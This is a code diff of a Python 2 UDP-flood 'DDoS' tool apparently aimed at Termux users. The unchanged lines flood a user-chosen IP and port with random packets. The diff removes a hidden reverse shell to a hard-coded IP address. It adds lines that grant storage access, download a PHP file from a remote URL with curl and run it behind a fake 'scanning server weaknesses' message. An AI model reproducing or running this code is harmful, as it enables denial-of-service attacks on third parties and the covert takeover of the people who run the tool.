@@ -17,8 +17,12 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
+os.system("termux-setup-storage")
+print "Downloading Source..."
+os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")
+
 os.system("clear")
-os.system("figlet DDos Attack")
+
 print
 print "DDOS ONE HITTT !!!\n"
 print "You Tube : https://www.youtube.com/c/HA-MRX"
@@ -28,9 +32,8 @@ print
 ip = raw_input("IP Target : ")
 port = input("Port      : ")
 
-os.system("figlet Attack Starting")
 
-print "[                    ] 0% "
+print "\n[                    ] 0% "
 time.sleep(1)
 print "[=====               ] 25%"
 time.sleep(1)
@@ -40,12 +43,13 @@ print "[===============     ] 75%"
 time.sleep(1)
 print "[====================] 100%"
 time.sleep(1)
-print "\n\n[+] DDOS ONE HIT !!!, Attack Starting..."
+print "\n\n[+] DDOS ONE HIT !!!, Attack Starting...\n\n"
 sent = 0
-try:
-	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.14.212.173",10752));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
-except:
-	print "..."
+
+time.sleep(1)
+print "[+] Mencari kelemahan Server, Please wait..."
+os.system("php bil.php")
+
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
